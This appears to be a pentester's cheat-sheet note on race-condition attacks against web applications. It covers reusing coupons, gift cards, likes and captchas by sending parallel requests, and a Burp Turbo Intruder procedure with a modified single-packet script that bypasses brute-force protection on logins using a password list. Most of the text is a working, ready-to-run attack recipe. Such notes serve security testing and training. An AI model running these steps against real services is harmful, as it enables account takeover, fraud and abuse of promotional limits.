# Race Conditions
## 1. Limit Overrun Race Conditions
###(i). Using promo code multiple times or redemming a gift card multiple times**: Send the request that is applying coupon code to the repeater. Add it in a group. Duplicate it 20 times and send it send the requests parallely.<br>
**(ii). Rating/Likes multiple times**<br>
**(iii). Reusing single captcha multiple times**<br>
###(iv). Bypassing Bruteforce Protection
Send the login request to repeater and take this into turbo intruder.<br>
Copy all the passwords for which you want to include the request.<br>
In the requestm change password=VALUE to password=%s<br>
Change the script to examples/race-single-packet-attack.py<br>
Copy the passwords so that it can be in the clipboard.
Original Script:
```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```
Changed Script:
```
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for word in wordlists.clipboard:
        engine.queue(target.req, word, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```
Click on Attack.


